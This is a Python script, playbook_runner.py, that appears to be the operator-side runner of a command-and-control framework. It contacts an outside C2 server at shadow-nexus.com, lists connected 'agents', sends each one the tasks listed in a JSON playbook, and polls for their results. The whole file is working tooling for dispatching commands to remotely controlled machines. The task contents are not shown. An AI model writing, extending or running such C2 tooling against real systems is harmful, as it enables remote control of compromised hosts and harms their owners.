# playbook_runner.py
import json
import time
import requests
import logging

C2_URL = "http://shadow-nexus.com:5000"
PLAYBOOK_PATH = "playbook.json"
POLL_INTERVAL = 1  # seconds

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("PlaybookRunner")

def load_playbook(path):
    with open(path, 'r') as f:
        return json.load(f)

def get_online_agents():
    try:
        res = requests.get(f"{C2_URL}/agents")
        return res.json().get("agents", [])
    except Exception as e:
        logger.error(f"Error fetching agents: {e}")
        return []

def send_task(agent_id, task_type, parameters=None):
    try:
        res = requests.post(f"{C2_URL}/tasks", json={
            "agent_id": agent_id,
            "task_type": task_type,
            "parameters": parameters or {}
        })
        return res.status_code == 200
    except Exception as e:
        logger.error(f"Error sending task: {e}")
        return False

def wait_for_result(agent_id, task_type):
    logger.info(f"Waiting for result of {task_type} on agent {agent_id}...")
    while True:
        try:
            res = requests.get(f"{C2_URL}/results/{agent_id}/{task_type}")
            if res.status_code == 200:
                return res.json()
        except:
            pass
        time.sleep(POLL_INTERVAL)

def run_playbook():
    playbook = load_playbook(PLAYBOOK_PATH)
    agent_cache = {}

    for step in playbook:
        task_type = step["task_type"]
        agent_name = step["agent"]
        params = step.get("parameters", {})

        # Resolve agent
        if agent_name not in agent_cache:
            agents = get_online_agents()
            matching = [a for a in agents if a["name"] == agent_name or a["id"] == agent_name]
            if not matching:
                logger.warning(f"No agent found with name or id '{agent_name}'")
                continue
            agent_cache[agent_name] = matching[0]["id"]

        agent_id = agent_cache[agent_name]

        logger.info(f"Sending task '{task_type}' to {agent_name} ({agent_id})")
        success = send_task(agent_id, task_type, params)
        if not success:
            logger.warning(f"Failed to send task {task_type} to {agent_id}")
            continue

        result = wait_for_result(agent_id, task_type)
        logger.info(f"Result for {task_type}: {result}")

if __name__ == "__main__":
    run_playbook()
